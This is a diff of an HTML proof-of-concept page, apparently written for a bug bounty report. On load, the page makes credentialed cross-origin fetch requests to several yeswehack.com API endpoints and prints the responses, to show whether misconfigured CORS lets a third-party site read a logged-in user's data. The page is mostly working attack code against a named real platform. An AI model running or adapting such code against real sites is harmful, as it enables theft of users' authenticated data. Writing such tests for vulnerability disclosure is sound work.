@@ -1,56 +1,61 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>YesWeHack CORS Credential Theft PoC</title>
+  <meta charset="utf-8">
+  <title>YesWeHack CORS Exploit PoC</title>
   <style>
-    body { font-family: Arial, background: #111; color: #0f0; padding: 20px; }
+    body { font-family: Arial, sans-serif; background: #111; color: #0f0; padding: 20px; }
     pre  { background: #000; padding: 10px; border: 1px solid #0f0; white-space: pre-wrap; }
     h2   { color: #0f0; }
   </style>
 </head>
 <body>
-  <h2>YesWeHack CORS Credential Theft PoC</h2>
-  <p>If this page (on <strong>spycifawx.github.io</strong> or another non-YesWeHack domain)
-     can read authenticated API responses from <code>yeswehack.com</code>, CORS is broken.</p>
 
-  <pre id="output">Running PoC...</pre>
+<h2>YesWeHack CORS Credential Theft PoC</h2>
+<p>
+  If this page (on a third-party origin) can read your YesWeHack responses,
+  CORS is misconfigured and allows theft of authenticated data.
+</p>
 
-  <script>
-    async function attack() {
-      const output = document.getElementById('output');
+<pre id="output">Running PoC…</pre>
 
-      const endpoints = [
-        "https://api.yeswehack.com/me",          // example: current user profile
-        "https://api.yeswehack.com/programs",    // example: programs list
-        "https://yeswehack.com/api/user/profile" // example: web-app endpoint
-      ];
+<script>
+async function attack() {
+  const output = document.getElementById('output');
 
-      let results = "";
+  const endpoints = [
+    "https://yeswehack.com/programs",
+    "https://yeswehack.com/profile",
+    "https://api.yeswehack.com/me",
+    "https://api.yeswehack.com/programs",
+    "https://apps.yeswehack.com/",
+  ];
 
-      for (const url of endpoints) {
-        try {
-          const res = await fetch(url, {
-            method: "GET",
-            credentials: "include"
-          });
+  let results = "";
 
-          const text = await res.text();
+  for (const url of endpoints) {
+    try {
+      const res = await fetch(url, {
+        method: "GET",
+        credentials: "include"
+      });
 
-          results += `==============================\n`;
-          results += `[${url}]\n`;
-          results += `STATUS: ${res.status}\n`;
-          results += `${text}\n\n`;
-        } catch (err) {
-          results += `==============================\n`;
-          results += `[${url}]\n`;
-          results += `ERROR: ${err}\n\n`;
-        }
-      }
+      const text = await res.text(); // works for JSON, HTML, errors, whatever
 
-      output.textContent = results;
+      results += `==============================\n`;
+      results += `[${url}] STATUS: ${res.status}\n`;
+      results += `${text.slice(0, 4000)}\n\n`; // truncate to keep PoC readable
+    } catch (err) {
+      results += `==============================\n`;
+      results += `[${url}] ERROR: ${err}\n\n`;
     }
+  }
 
-    attack();
-  </script>
+  output.textContent = results;
+}
+
+attack();
+</script>
+
 </body>
 </html>
